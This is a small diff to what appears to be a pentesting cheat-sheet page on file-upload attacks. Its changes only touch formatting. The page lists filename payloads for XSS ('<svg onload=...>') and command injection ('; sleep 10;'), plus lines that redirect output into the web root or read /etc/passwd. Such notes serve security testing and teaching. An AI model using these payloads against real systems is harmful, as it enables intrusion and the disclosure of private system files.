@@ -20,9 +20,11 @@ Set filename to <svg onload=alert(document.domain)> to achieve a XSS
 Set filename to ; sleep 10; to test some command injection --> https://book.hacktricks.xyz/pentesting-web/command-injection
 
 
-#Not executed but may be interesting
+# Not executed but may be interesting
+```
 > /var/www/html/out.txt #Try to redirect the output to a file
 < /etc/passwd #Try to send some input to the command
-
+```
+             
 https://book.hacktricks.xyz/pentesting-web/file-upload#from-file-upload-to-other-vulnerabilities
 https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt
